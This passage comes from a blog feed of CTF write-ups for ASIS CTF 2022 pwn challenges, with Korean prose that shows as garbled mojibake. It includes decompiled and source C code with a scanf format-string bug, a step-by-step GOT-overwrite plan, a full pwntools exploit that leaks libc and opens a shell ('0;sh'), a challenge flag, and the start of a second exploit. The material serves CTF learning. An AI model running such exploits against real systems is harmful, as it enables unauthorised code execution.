ÏõêÌïòÎäî Í∞íÏùÑ Ï†ÅÏùÑ Ïàò ÏûàÎã§.</em></p></li></ol><p>Ïñ¥ÎñªÍ≤å fsbÎ•º Ìä∏Î¶¨Í±∞Ìï† Ïàò ÏûàÏùÑÍπå? <code>baby sacn 1</code>ÏùÑ ÌíÄÏóàÎçò Í≤ÉÏ≤òÎüº <code>0</code>ÏùÑ ÏûÖÎ†•Ìï¥ÏÑú Ïä§ÌÉùÏùÑ ÏÇ¥Ìé¥Î≥¥Î©∞ ÏÉùÍ∞ÅÌï¥Î≥¥Ïûê.</p><p>4Î≤àÏß∏ Í≥ºÏ†ïÏùÑ ÏßÑÌñâÌï† Îïå Ï¶â, <code>scanf</code>Î•º Ïù¥Ïö©ÌïòÏó¨ ÏûÖÎ†•ÏùÑ ÏßÑÌñâÌï† Îïå argumentsÎäî ÏïÑÎûòÏôÄ Í∞ôÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffcdabcf878 ‚Üí 0x00000000733025 (&quot;%0s&quot;?),</span><br><span class="line">   $rsi = 0x0000000172a2a0 ‚Üí 0x0000000000000000,</span><br><span class="line">   $rdx = 0x0000000172a2a0 ‚Üí 0x0000000000000000</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Ï≤´ Î≤àÏß∏ Ïù∏ÏûêÏóê Ï£ºÎ™©Ìï¥ÏÑú ÏÉùÍ∞ÅÏùÑ Ìï¥Î≥¥Ïûê. Ïö∞Î¶¨Îäî Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏùÑ ÎßàÏùåÎåÄÎ°ú ÏßëÏñ¥ÎÑ£Ïñ¥ÏÑú ÏûÖÎ†•Ìï† Ïàò ÏûàÎã§. <code>printf</code> Ìï®ÏàòÏóêÏÑú Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏùÑ Ï†ïÏùòÌï¥Ï£ºÏßÄ ÏïäÍ≥† Ïö∞Î¶¨Ïùò ÏûÖÎ†•Í∞íÎßå Ïù∏ÏûêÎ°ú Îì§Ïñ¥Í∞ÑÎã§Î©¥ fsbÎ•º Ïù¥Ïö©Ìï¥ÏÑú Ïä§ÌÉùÏùÑ leakÌïòÍ±∞ÎÇò Ïä§ÌÉùÏóê ÏõêÌïòÎäî Í∞íÏùÑ ÎÑ£ÏùÑ Ïàò ÏûàÎã§.</p><p><code>scanf</code>ÏóêÏÑúÎèÑ ÎòëÍ∞ôÏù¥ ÌÜµÌïòÏßÄ ÏïäÏùÑÍπå? ÌÇ§Î≥¥ÎìúÎ°úÎ∂ÄÌÑ∞ ÏûÖÎ†•ÏùÑ Î∞õÎäî Ìï®ÏàòÎãàÍπê Ï∂úÎ†•ÏùÄ ÌïòÏßÄ Î™ªÌïòÎçîÎùºÎèÑ ÏõêÌïòÎäî Ïä§ÌÉù Ï£ºÏÜåÏóê ÏõêÌïòÎäî Í∞íÏùÑ Ï†ÅÏùÑ Ïàò ÏûàÏßÄ ÏïäÏùÑÍπå?</p><p>sizeÎ•º ÏûÖÎ†• Î∞õÏùÑ Îïå 15Í∏ÄÏûêÎ•º ÏûÖÎ†•Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%15s&quot;, size)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/20gx $rsp</span><br><span class="line">0x7ffcdabcf870:0x00007fab4b8902e80x0000000000733025</span><br><span class="line">0x7ffcdabcf880:0x00000000000000300x0000000000401170 &lt;-- [!]</span><br><span class="line">0x7ffcdabcf890:0x00007ffcdabcf9900x000000000172a2a0</span><br><span class="line">0x7ffcdabcf8a0:0x00000000000000000x00007fab4b6c3083</span><br><span class="line">0x7ffcdabcf8b0:0x00000001000000180x00007ffcdabcf998</span><br><span class="line">0x7ffcdabcf8c0:0x000000014b8877a00x0000000000401256</span><br><span class="line">0x7ffcdabcf8d0:0x00000000004013900x03f4474d8e43ddf7</span><br><span class="line">0x7ffcdabcf8e0:0x00000000004011700x00007ffcdabcf990</span><br><span class="line">0x7ffcdabcf8f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7ffcdabcf900:0xfc0df2347f23ddf70xfca2d195ee2dddf7</span><br></pre></td></tr></table></figure><p>sizeÎ•º ÏûÖÎ†•Ìï† Îïå 9Î≤àÏß∏ offsetÏùÑ Ïª®Ìä∏Î°§Ìï† Ïàò ÏûàÎã§. ÌòÑÏû¨Îäî <code>0x401170</code>Ïù¥ Ïì∞Ïó¨ÏûàÎäîÎç∞, Ïù¥Í±∞ ÎåÄÏã† ÏõêÌïòÎäî got ÎÑ£ÏùÑ Ïàò ÏûàÎã§Î©¥?</p><p>ÏûêÏûê, <em>Ï∑®ÏïΩÏ†êÏùÑ Ìä∏Î¶¨Í±∞ ÌïòÍ∏∞ ÏúÑÌï¥ÏÑú Ïö∞Î¶¨Í∞Ä ÏïåÍ≥† ÏûàÎäî Ï†ïÎ≥¥</em>Î•º Ï†ïÎ¶¨Ìï¥Î≥¥Ïûê. </p><ol><li><p><code>scanf(fmt, buf)</code>ÏóêÏÑú fsbÎ•º Ìä∏Î¶¨Í±∞Ìï† Ïàò ÏûàÏùÑ Í≤ÉÎßå Í∞ôÎã§.</p></li><li><p>9Î≤àÏß∏ offsetÏóê ÏûÖÎ†•Ìï† Ïàò ÏûàÎã§. Ïñ∏Ï†ú? <code>scanf(&quot;%15s&quot;, size)</code>ÏóêÏÑú.</p></li><li><p><code>fmt</code>Îäî <code>%&lt;Ïù∏Ìíã&gt;s</code>Ïù¥Îã§.</p></li></ol><p>&#x3D;&gt; <code>data</code>Î•º ÏûÖÎ†•Ìï† Îïå <code>scanf(&quot;%9$s&quot;, buf)</code>Í∞Ä ÎêòÏñ¥ ÏõêÌïòÎäî Ï£ºÏÜåÏóê ÏõêÌïòÎäî Í∞íÏùÑ Ïì∏ Ïàò ÏûàÏùÑ Í≤ÉÏù¥Îã§. got overwritingÏù¥ Í∞ÄÎä•Ìï† Í≤ÉÏù¥Îã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ÏùµÏä§Î•º ÏúÑÌï¥ idaÏóêÏÑúÎèÑ ÏÇ¥Ìé¥Î≥¥Ïûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> fmt[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%15s&quot;</span>, nptr);</span><br><span class="line">  <span class="keyword">if</span> ( ((*__ctype_b_loc())[nptr[<span class="number">0</span>]] &amp; <span class="number">0x800</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = atoi(nptr);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="number">8uLL</span>, <span class="string">&quot;%%%ss&quot;</span>, nptr);</span><br><span class="line">  __isoc99_scanf(fmt, v6);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïö∞Î¶¨Îäî ÌòÑÏû¨ ÌäπÏ†ï Ìï®ÏàòÏùò gotÎ•º ÎçÆÏùÑ Ïàò ÏûàÎäîÎç∞, <code>atoi</code> Ìï®ÏàòÍ∞Ä Ï†ïÎßêÏ†ïÎßê ÎÑàÎ¨¥ÎÑàÎ¨¥ Ïù¥Í≤ÉÏ†ÄÍ≤ÉÌïòÍ∏∞Ïóê Ï†ÅÎãπÌï¥ Î≥¥Ïù∏Îã§. (Ïù∏ÏûêÎ•º ÌïòÎÇòÎßå Î∞õÏïÑÏÑú..)</p><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>Ï≤òÏùåÏóê leakÌï† Îïå <code>atoi@got</code>Î•º <code>puts</code>Î°ú ÎçÆÏñ¥ÏÑú Î¶≠ÌïòÎ†§Í≥† ÌñàÏóàÎã§. Îß§Ïö∞Îß§Ïö∞Îß§Ïö∞Îß§Ïö∞Îß§Ïö∞ Î∞îÎ≥¥Í∞ôÏùÄ ÏÉùÍ∞ÅÏù¥ÏóàÎã§. leakÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜåÎ•º ÎÑ£Ïñ¥Ï£ºÎ©¥ Í≥†ÎåÄÎ°ú Ï∂úÎ†•Ìï¥Ï§ÄÎã§. (‚Ä¶)</p><p>leakÌï† ÎïåÎèÑ fsbÎ•º Ïù¥Ïö©Ìï¥Ïïº ÌïúÎã§. Í∑∏ÎûòÏÑú <code>atoi@got</code>ÏùÑ <code>printf</code>Î°ú ÎçÆÍ≥†, <code>ntpr</code>Ïóê Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏùÑ ÎÑ£Ïñ¥Ï§òÏïº ÌïúÎã§.</p><h3 id="isdigit-bypass"><a href="#isdigit-bypass" class="headerlink" title="isdigit() bypass"></a><code>isdigit()</code> bypass</h3><p>prototypeÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isdigit</span><span class="params">( <span class="type">int</span> arg )</span>;</span><br></pre></td></tr></table></figure><p>parameterÎ°úÎäî <code>char</code>Í∞Ä Îì§Ïñ¥Í∞ÄÏïº ÌïúÎã§. ‚Äò0‚Äô ~ ‚Äò9‚Äô Ïùò Í∞íÎßå Îì§Ïñ¥Í∞à Ïàò ÏûàÎäîÎç∞, Ïù¥ Î¨∏Ï†úÏóêÏÑúÏÑúÎäî 15Í∏ÄÏûêÎ•º Ïù∏ÏûêÎ°ú Ï§Ñ Ïàò ÏûàÎã§.<br>Îî∞ÎùºÏÑú <code>0&lt;ÏûÖÎ†•&gt;</code> Ïù¥Îü∞ÏãùÏúºÎ°ú Ï≤´ Í∏ÄÏûêÏóê Ïà´Ïûê ÌïòÎÇòÎ•º Ï£ºÍ≥† Îí§Ïóê ÏõêÌïòÎäî Î¨∏ÏûêÎì§ÏùÑ Ïç®ÏÑú Ïù¥ Í≤ÄÏÇ¨Î•º Ïö∞ÌöåÌï† Ïàò ÏûàÎã§.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><code>exit@got</code>Î•º <code>main</code> Ï£ºÏÜåÎ°ú ÎçÆÏñ¥ Î¨¥ÌïúÌûà Ïã§ÌñâÎêòÍ≤å ÌïòÍ∏∞</li><li><code>atoi@got</code>Î•º <code>printf</code> Ï£ºÏÜåÎ°ú ÎçÆÏñ¥ leakÌï† Ïàò ÏûàÍ≤å Íµ¨ÏÑ±ÌïòÍ∏∞</li><li><code>0%29$p</code>Î•º Î≥¥ÎÇ¥ÏÑú <code>__libc_start_main - 243</code> leak</li><li><code>system</code> Ïã§Ï†ú Ï£ºÏÜåÎ•º Íµ¨Ìïú ÌõÑ <code>atoi@got</code>ÏùÑ ÎçÆÍ∏∞</li><li>ÎßàÏßÄÎßâÏúºÎ°ú <code>0;sh</code>Î•º Î≥¥ÎÇ¥ shell ÌöçÎìù</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pchall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">33710</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pchall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit@got -&gt; main</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;exit&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(e.symbols[&#x27;main&#x27;])</span></span><br><span class="line">payload = p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># atoi@got -&gt; puts</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(e.symbols[<span class="string">&#x27;printf&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">payload = <span class="string">b&#x27;0%29$p&#x27;</span><span class="comment">#b&#x27;9$&#x27;.ljust(8, b&#x27;\x00&#x27;) + p64(e.got[&#x27;atoi&#x27;])[:-1]</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;00x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">243</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># atoi@got -&gt; system</span></span><br><span class="line">payload = <span class="string">b&#x27;9$&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])[:-<span class="number">1</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">&#x27;0;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="data-Î≥¥ÎÇº-Îïå-0-7-Î°ú-ÏûêÎ•∏-Ïù¥Ïú†"><a href="#data-Î≥¥ÎÇº-Îïå-0-7-Î°ú-ÏûêÎ•∏-Ïù¥Ïú†" class="headerlink" title="data Î≥¥ÎÇº Îïå [0:7]Î°ú ÏûêÎ•∏ Ïù¥Ïú†?"></a><code>data</code> Î≥¥ÎÇº Îïå <code>[0:7]</code>Î°ú ÏûêÎ•∏ Ïù¥Ïú†?</h3><p><code>scanf</code> Ìï®ÏàòÎäî ÏûÖÎ†•Ìï† Îïå ÎßàÏßÄÎßâÏóê Null byteÎ•º ÏÇΩÏûÖÌïúÎã§.<br><code>p64()</code>Î°ú Ìå®ÌÇπÌï¥ÏÑú Î≥¥ÎÇ¥Í≤å ÎêòÎ©¥ 8Î∞îÏù¥Ìä∏Î•º Ï†ÑÏÜ°ÌïòÍ≤å ÎêúÎã§. Ïù¥Îïå <code>scanf</code>Î°ú ÏûÖÎ†•ÏùÑ Î∞õÏïòÍ∏∞ ÎïåÎ¨∏Ïóê ÎßàÏßÄÎßâÏóê Null byteÍ∞Ä Ï∂îÍ∞ÄÎêòÏñ¥ <code>_ctype_b_loc@got.plt</code>Î•º ÎçîÎüΩÌòÄÎ≤ÑÎ†∏Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/2gx 0x0000000000404058</span><br><span class="line">0x404058 &lt;exit@got.plt&gt;:0x00000000004012560x00007fba7666d400</span><br><span class="line">gef&gt; x/gx 0x0000000000404058 + 0x8</span><br><span class="line">0x404060 &lt;__ctype_b_loc@got.plt&gt;:0x00007fba7666d400</span><br><span class="line">gef&gt; x/gx 0x00007fba7666d400</span><br><span class="line">0x7fba7666d400 &lt;isspace_l+16&gt;:0x66c3c0b70f200025</span><br></pre></td></tr></table></figure><p>ÏïÑÎûòÍ∞Ä Ïò¨Î∞îÎ•∏ Í≤ΩÏö∞Ïù¥Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/2gx 0x0000000000404058</span><br><span class="line">0x404058 &lt;exit@got.plt&gt;:0x00000000004012560x00007fdc030534a0</span><br><span class="line">gef&gt; x/gx 0x0000000000404058 + 0x8</span><br><span class="line">0x404060 &lt;__ctype_b_loc@got.plt&gt;:0x00007fdc030534a0</span><br><span class="line">gef&gt; x/gx 0x00007fdc030534a0</span><br><span class="line">0x7fdc030534a0 &lt;__ctype_b_loc&gt;:0x5d058b48fa1e0ff3</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;fd408e00d5824d7220c4d624f894144e&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> ASIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> scanf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2022 - baby scan 1</title>
      <link href="/221017-asisctf2022-babysacn_1/"/>
      <url>/221017-asisctf2022-babysacn_1/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(87&#x2F;532) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Is it possible to scan the thousands of resulting strings by hand? We think it‚Äôs tedious, but will get the job done!</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ bin</span><br><span class="line">‚îÇ¬†¬† ‚îî‚îÄ‚îÄ chall</span><br><span class="line">‚îú‚îÄ‚îÄ lib</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ld-2.31.so</span><br><span class="line">‚îÇ¬†¬† ‚îî‚îÄ‚îÄ libc.so.6</span><br><span class="line">‚îú‚îÄ‚îÄ run.sh</span><br><span class="line">‚îî‚îÄ‚îÄ src</span><br><span class="line">    ‚îî‚îÄ‚îÄ main.c</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)alloca(atoi(size) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloca</code> Ìï®ÏàòÎäî Ïä§ÌÉùÏóê Î©îÎ™®Î¶¨Î•º Ìï†ÎãπÌïòÎäî Ìï®ÏàòÏù¥Îã§.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>Ìè¨Îß∑Ïä§Ìä∏ÎßÅ Ïù∏ÏûêÎ•º ÎßàÏùåÎåÄÎ°ú Ï§Ñ Ïàò ÏûàÏúºÎãà ÏûÖÎ†•ÏúºÎ°ú 0ÏùÑ ÎÑ£ÏúºÎ©¥ stack overflowÎ•º Ìä∏Î¶¨Í±∞Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%0s&quot;</span>, buf);</span><br></pre></td></tr></table></figure><p>same as</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li><code>%0s</code> Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏúºÎ°ú overflow Ìä∏Î¶¨Í±∞</li><li>ÏõêÍ∞ÄÏ†Ø</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = 